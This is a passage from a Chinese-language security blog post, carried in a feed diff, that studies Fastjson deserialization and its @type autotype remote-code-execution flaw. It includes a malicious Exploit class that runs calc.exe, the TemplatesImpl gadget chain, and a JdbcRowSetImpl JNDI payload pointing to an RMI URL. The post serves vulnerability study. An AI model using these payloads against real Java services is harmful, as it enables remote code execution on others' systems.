-<p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
-</blockquote>
-<h2 id="使用fastjson进行序列化">使用Fastjson进行序列化</h2>
-<p>Fastjson在对对象进行序列化和反序列化时，需要使用到如下三个函数：</p>
-<ul>
-<li><code>JSON.toJSONString()</code></li>
-<li><code>JSON.parse()</code></li>
-<li><code>JSON.parseObject()</code></li>
-</ul>
-<h3 id="一段demo">一段Demo</h3>
-<p>现在先尝试使用fastjson对自定义的类进行反序列化，熟悉以下具体的操作。</p>
-<pre><code class="language-java">package cc.study;
-
-public class User {
-    private Long id;
-    private String name;
-
-    public Long getId() {
-        return id;
-    }
-
-    public void setId(Long id) {
-        this.id = id;
-    }
-
-    public String getName() {
-        return name;
-    }
-
-    public void setName(String name) {
-        this.name = name;
-    }
-}
-</code></pre>
-<p>然后编写main函数</p>
-<pre><code class="language-java">package cc.study;
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.JSONObject;
-
-import java.security.spec.EncodedKeySpec;
-
-public class FastjsonStudy {
-    public static void Enc(){
-        User guestUser = new User();
-        guestUser.setId(3L);
-        guestUser.setName(&quot;ZHANGSAN&quot;);
-        String jsonString = JSON.toJSONString(guestUser);
-        System.out.println(jsonString);
-    }
-
-    public static void main(String[] args) {
-        Enc();
-    }
-}
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://limpid94.github.io/post-images/1627985599522.PNG" alt="" loading="lazy"></figure>
-<p>若要在结果中输出类型信息，需要使用<code>String jsonString = JSON.toJSONString(guestUser, SerializerFeature.WriteClassName);</code><br>
-则输出的结果为：<br>
-<img src="https://limpid94.github.io/post-images/1627987808220.PNG" alt="" loading="lazy"></p>
-<p>接下来要了解两个反序列化方法在反序列化的结果有何不同。同样使用上面的User类，但是此时添加toString方法方便将反序列化后的类进行输出。</p>
-<pre><code class="language-java">    @Override
-    public String toString() {
-        return &quot;User{&quot; +
-                &quot;id=&quot; + id +
-                &quot;, name='&quot; + name + '\'' +
-                '}';
-    }
-</code></pre>
-<p>测试的4中方法分别为</p>
-<ul>
-<li>第一种：JSON.parse(serializedStr)</li>
-<li>第二种：JSON.parseObject(serializedStr)</li>
-<li>第三种：JSON.parseObject(serializedStr, Object.class)</li>
-<li>第四种：JSON.parseObject(serializedStr, User.class)</li>
-</ul>
-<p>测试代码如下：</p>
-<pre><code class="language-java">package cc.study;
-
-import com.alibaba.fastjson.JSON;
-
-public class test1 {
-    public static void main(String[] args) {
-        String jstring = &quot;{\&quot;@type\&quot;:\&quot;cc.study.User\&quot;,\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;ZHANGSAN\&quot;}&quot;;
-        System.out.println(&quot;[*] ============= 通过parse方法进行反序列化 ===========&quot;);
-        System.out.println(&quot;JSON.parse(serializedStr)：&quot;);
-        Object obj1 = JSON.parse(jstring);
-        System.out.println(&quot;parse反序列化对象名称:&quot; + obj1.getClass().getName());
-        System.out.println(&quot;parse反序列化：&quot; + obj1);
-        System.out.println(&quot;-----------------------------------------------\n&quot;);
-        System.out.println(&quot;JSON.parseObject(serializedStr)：&quot;);
-        Object obj2 = JSON.parseObject(jstring);
-        System.out.println(&quot;parseObject反序列化对象名称:&quot; + obj2.getClass().getName());
-        System.out.println(&quot;parseObject反序列化:&quot; + obj2);
-        System.out.println(&quot;-----------------------------------------------\n&quot;);
-
-        //通过parseObject,指定为object.class
-        System.out.println(&quot;JSON.parseObject(serializedStr, Object.class)：&quot;);
-        Object obj3 = JSON.parseObject(jstring, Object.class);
-        System.out.println(&quot;parseObject反序列化对象名称:&quot; + obj3.getClass().getName());
-        System.out.println(&quot;parseObject反序列化:&quot; + obj3);
-        System.out.println(&quot;-----------------------------------------------\n&quot;);
-
-        //通过parseObject,指定为User.class
-        System.out.println(&quot;JSON.parseObject(serializedStr, User.class)：&quot;);
-        Object obj4 = JSON.parseObject(jstring, User.class);
-        System.out.println(&quot;parseObject反序列化对象名称:&quot; + obj4.getClass().getName());
-        System.out.println(&quot;parseObject反序列化:&quot; + obj4);
-        System.out.println(&quot;-----------------------------------------------\n&quot;);
-    }
-}
-
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://limpid94.github.io/post-images/1628004571112.PNG" alt="" loading="lazy"></figure>
-<p>从结果可以知晓：</p>
-<ul>
-<li>第一种情况，在指定<code>@type</code>后会自动调用默认类的构造器（此处为User的构造器）、User类的setter方法并最终产生一个User类的实例。此处会给public修饰的赋值，而不会给private修饰的赋值。在1.2.22, 1.1.54.android之后，增加了一个SupportNonPublicField特性，就算private修饰的没有setter方法也能成功赋值。</li>
-<li>第二种情况，在指定了@type的情况下，自动调用了User类默认构造器，User类对应的setter方法以及对应的getter方法，最终结果是一个字符串。</li>
-<li>第三种情况，在指定了@type的情况下，这种写法和第一种JSON.parse(serializedStr)写法其实没有区别的。</li>
-<li>第四种情况，在指定了@type的情况下，自动调用了User类默认构造器，User类对应的setter方法，最终生成User类的一个实例。</li>
-</ul>
-<h3 id="fastjson大致框架">Fastjson大致框架</h3>
-<p><img src="https://limpid94.github.io/post-images/1628012127988.png" alt="" loading="lazy"><br>
-<code>JSON的门面类</code>主要提供静态方法，例如parse、parseObject。而具体的实现则在<code>DefaultJSONParser</code>中。<code>ParserConfig</code>主要保存一些相关配置信息，<code>JSONLexerBase</code>这个类用来处理字符分析。而反序列化用到的<code>JavaBeanDeserializer</code>则是JavaBean反序列化处理主类。</p>
-<h2 id="fastjson反序列化漏洞">Fastjson反序列化漏洞</h2>
-<h3 id="产生原因">产生原因</h3>
-<p>漏洞是利用fastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。</p>
-<h2 id="poc代码">POC代码</h2>
-<p>POC在网上流传的类型可分为三类：</p>
-<ol>
-<li>基于TemplateImpl</li>
-<li>基于JNDI Bean Property类型</li>
-<li>基于JNDI Field类型</li>
-</ol>
-<p>在第一种情况下，基于TemplateImpl需要打开SupportNonPublic开关，受到的限制比较多</p>
-<h3 id="恶意类的编写">恶意类的编写</h3>
-<pre><code class="language-java">import java.io.IOException;
-
-public class Exploit {
-    static {
-        try {
-            Runtime.getRuntime().exec(new String[]{&quot;calc.exe&quot;});
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
-}
-</code></pre>
-<p>之后使用javac对其进行编译，生成Exploit.class即可。</p>
-<h3 id="基于templateimpl的poc">基于TemplateImpl的POC</h3>
-<p>实质：用<code>bytecode</code>字段传入恶意类，调用<code>outputProperties</code>属性的getter方法时传入恶意类并调用其构造方法，导致命令执行。</p>
-<p>调用链：</p>
-<p>-&gt; TemplatesImpl()<br>
--&gt; getOutputProperties()<br>
--&gt; newTransformer()<br>
--&gt; getTransletInstance()<br>
--&gt; defineTransletClasses()<br>
--&gt; newInstance()</p>
-<p>在TemplatesImpl类实例化后，会执行相应的setter方法给属性赋值，而到了<code>_outputProperties</code>属性时会调用其<code>getOutputProperties()</code>方法，其中调用了<code>newTransformer()</code>方法:</p>
-<pre><code class="language-java">public synchronized Properties getOutputProperties() {
-        try {
-            return newTransformer().getOutputProperties();
-        }
-        catch (TransformerConfigurationException e) {
-            return null;
-        }
-    }
-</code></pre>
-<p><code>newTransformer</code>调用<code>getTransletInstance()</code>方法：<br>
-<img src="https://limpid94.github.io/post-images/1628239706767.PNG" alt="" loading="lazy"><br>
-其中有两个关键的方法，defineTransletClasses() 和 newInstance() ，前者是把恶意类带到数组中去，后者用于实例化<code>_class[_transletIndex]</code> 中的Class。<br>
-<img src="https://limpid94.github.io/post-images/1628242435685.PNG" alt="" loading="lazy"><br>
-从方法的代码可以看到其中调用了<code>defindClass</code>方法处理所传入的恶意类的字节码。第299行的<code>defineClass</code>从<code>byte[]</code>中还原出了恶意类对象并放入到了_class[]数组中<br>
-而后getTransletInstance()方法调用newInstance() 反射实例化恶意类，成功执行命令<br>
-<img src="https://limpid94.github.io/post-images/1628242740407.PNG" alt="" loading="lazy"></p>
-<h3 id="基于jndi-bean-property类型的poc">基于JNDI Bean Property类型的POC</h3>
-<pre><code class="language-json">{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:33891/Exploit&quot;,&quot;autoCommit&quot;:true}
-</code></pre>
-<p>本质上是Fastjson在反序列化时会调用目标类的<code>setter</code>方法，在Gadget <code>com.sun.rowset.JdbcRowSetImpl的setAutoCommit()</code>方法中调用了<code>lookup()</code>,且其参数(DataSourceName的setter方法设置)可控，导致JNDI注入,最终任意命令执行</p>
-<p>利用链</p>
-<p>-&gt; JdbcRowSetImpl.execute()<br>
--&gt; JdbcRowSetImpl.prepare()<br>
--&gt; JdbcRowSetImpl.connect()<br>
--&gt; InitialContext.lookup(dataSource)</p>
-<p>能够使用JdbcRowSetImpl的原因是：<br>
-Fastjson会调用对应的setter、getter方法，而传入的序列化字符串中含有<code>dataSourceName</code>，因此会调用<code>setDataSourceName(String dsName)</code>，其方法的源码如下：<br>
-<img src="https://limpid94.github.io/post-images/1628183795947.PNG" alt="" loading="lazy"><br>
-而<code>autoCommit</code>参数也会使Fastjson去调用<code>setAutoCommit</code>，其源码如下：<br>
-<img src="https://limpid94.github.io/post-images/1628184214717.PNG" alt="" loading="lazy"><br>
-其中调用了<code>connet()</code>方法：<br>
-<img src="https://limpid94.github.io/post-images/1628184427534.PNG" alt="" loading="lazy"><br>
-在该方法中的<code>getDataSourceName()</code>来获取<code>DataSourceName</code>，也就是上面的<code>setDataSourceName()</code>，因此可以构成一条利用连。</p>
-<h3 id="基于jndi-field类型的poc">基于JNDI Field类型的POC</h3>
-<p>暂时未找到太多的材料，之后有机会整理全再补充。</p>
-<h2 id="参考材料">参考材料</h2>
-<p>http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</p>
-<p>https://www.freebuf.com/column/216631.html</p>
-<p>https://paper.seebug.org/1274/<br>
-https://5alt.me/2017/09/fastjson%E8%B0%83%E8%AF%95%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</p>
 ]]></content>
     </entry>
 </feed>
